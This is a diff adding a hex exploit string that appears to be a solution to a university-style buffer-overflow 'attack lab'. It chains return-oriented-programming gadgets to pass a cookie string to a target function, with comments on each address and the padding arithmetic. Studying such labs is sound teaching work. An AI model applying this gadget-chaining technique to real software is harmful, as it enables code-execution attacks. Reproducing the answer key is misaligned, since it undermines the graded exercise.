@@ -1,0 +1,19 @@
+00 00 00 00 00 00 00 00  	/* filler, 5*8 =40 bytes = 80 hex digits */
+00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00  
+06 1a 40 00 00 00 00 00   /* 1 mov %rsp, %rax; ret: addr: 0x401a06 */
+d8 19 40 00 00 00 00 00   /* 2 add 0x37, %al; ret:  addr: 0x4019d8 */
+a2 19 40 00 00 00 00 00   /* 3 mov %rax, %rdi; ret  addr: 0x4019a2 */
+fa 18 40 00 00 00 00 00   /* 4 addr of touch3: 0x4018fa            */
+                                                                  
+00 00 00 00 00 00 00 00   /* filler, 55(0x37) - 3*8(3 addrs) = 31 bytes  */
+00 00 00 00 00 00 00 00   
+00 00 00 00 00 00 00 00   
+00 00 00 00 00 00 00      
+                     35  /* hex format of cookie string */ 
+39 62 39 39 37 66 61 00   
+
+/* According to the ctarget labs, the value in %rsp is 0x5561dc70, */ 
+/*  then addition instruction maybe not cause overflow */ 
